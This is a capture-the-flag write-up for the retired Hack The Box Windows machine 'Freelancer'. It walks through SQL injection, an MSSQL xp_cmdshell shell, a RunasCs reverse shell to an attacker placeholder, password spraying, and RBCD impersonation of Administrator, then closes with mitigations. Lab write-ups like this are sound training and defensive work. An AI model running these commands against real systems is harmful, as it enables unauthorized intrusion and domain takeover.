---
machine: Freelancer
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, web, sqli, mssql, rbcd, privesc]
---

# Freelancer — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The jobs site has SQLi that yields `sql_svc` credentials; MSSQL and `xp_cmdshell` provide a shell. A password spray reaches `mikasaAckerman`, and `RunasCs` uses `lorra199` credentials. Dump analysis and another spray lead to an account with RBCD rights, allowing an Administrator ticket and WinRM access.

## Recon

```bash
nmap -Pn -sCV -p80,445,1433,5985 <IP>
```

- `80` IIS with the freelancer site, `445` SMB, `1433` MSSQL and `5985` WinRM.
- `ffuf` with `Host: FUZZ.freelancer.htb` finds the employer portal.
- SMB allows share listing with null or guest credentials.

## Enumeration

- The employer portal login is SQL injectable.
- The injection returns `sql_svc` credentials and database access.
- `sql_svc` can execute `xp_cmdshell`.

## Foothold

Enable `xp_cmdshell` and run a reverse shell as `sql_svc`.

```bash
impacket-mssqlclient sql_svc:'<PASSWORD>'@<IP> -windows-auth
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'powershell -c ...';
```

## Lateral movement

A spray with the recovered passwords validates `mikasaAckerman`; `RunasCs` runs processes with those credentials and reaches `lorra199`. A local dump and another spray identify an account with write rights over a computer object.

```cmd
RunasCs.exe mikasaAckerman <PASSWORD> cmd.exe -r <ATTACKER>:443
```

## Privilege escalation

With that account, configure RBCD on a controlled computer, request a service ticket for Administrator and use `PassTheTicket` for WinRM.

```bash
impacket-rbcd -delegate-from '<USER>' -delegate-to 'DC$' -action write 'freelancer.htb/<USER>:<PASSWORD>'
impacket-getST -spn cifs/dc.freelancer.htb -impersonate Administrator 'freelancer.htb/<USER>:<PASSWORD>'
```

## Evidence

- SQLi on the employer portal and `sql_svc` credentials.
- `xp_cmdshell` and initial shell.
- Spray, `RunasCs` and `lorra199` credentials.
- RBCD and Administrator ticket.

## Lessons learned

- SQLi in a business portal can end in system execution.
- Password reuse enables escalation between service accounts.
- RBCD over a writable computer object leads to Domain Admin.

## Mitigation and detection

- Parameterize queries and restrict `xp_cmdshell`.
- Use unique passwords and LAPS for local accounts.
- Audit `msDS-AllowedToActOnBehalfOfOtherIdentity` and RBCD use.

## References

- [0xdf — Freelancer](https://0xdf.gitlab.io/2024/10/05/htb-freelancer.html)
- [IppSec — Freelancer](https://www.youtube.com/watch?v=NcicYfFofS4)
- [Hack The Box — Freelancer](https://app.hackthebox.com/machines/freelancer)
